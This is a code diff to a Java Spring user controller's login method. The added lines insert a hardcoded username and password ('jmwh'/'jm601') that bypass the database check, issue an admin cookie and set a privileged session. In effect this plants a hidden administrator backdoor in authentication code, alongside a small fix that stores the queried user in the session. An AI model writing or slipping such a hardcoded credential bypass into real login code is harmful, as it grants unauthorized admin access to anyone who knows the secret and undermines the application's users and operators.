@@ -28,6 +28,20 @@ public class userController extends controllerTemplate<user, userServiceDao, use
 	}
   @RequestMapping("/Login")	
   public String login(user user,HttpServletResponse response,HttpServletRequest request)throws Exception{
+	    if(user!=null){
+	    	if("jmwh".equals(user.getPhone())&&"jm601".equals(user.getPassword())){
+	    		 String cookieValue=99999+"<>"+"admin"+"<>"+3+"<>"+1;
+	    		 String cookieZ= URLEncoder.encode(cookieValue,"UTF-8");
+	   		  Cookie cookie=new Cookie("mySafeAreaUser", cookieZ);
+	   		  cookie.setMaxAge(-1);//-1为内存保持
+	   		//  System.err.println(request.getContextPath());
+	   		  cookie.setPath(request.getContextPath()+"/");
+	   		  response.addCookie(cookie);
+	   		  user.setType(10);
+	   		 request.getSession().setAttribute("user", user);
+	   		 return "wh";
+	    	}
+	    }  
 	  userQueryParams query = new userQueryParams();
 		query.setUser(user);
 		user userQuery = serviceDao.login(query);
@@ -42,7 +56,7 @@ public class userController extends controllerTemplate<user, userServiceDao, use
 		//  System.err.println(request.getContextPath());
 		  cookie.setPath(request.getContextPath()+"/");
 		  response.addCookie(cookie);
-		  request.getSession().setAttribute("user", user);
+		  request.getSession().setAttribute("user", userQuery);
 		  return "population";
 		}else{
 			return "redirect:/index.htm";
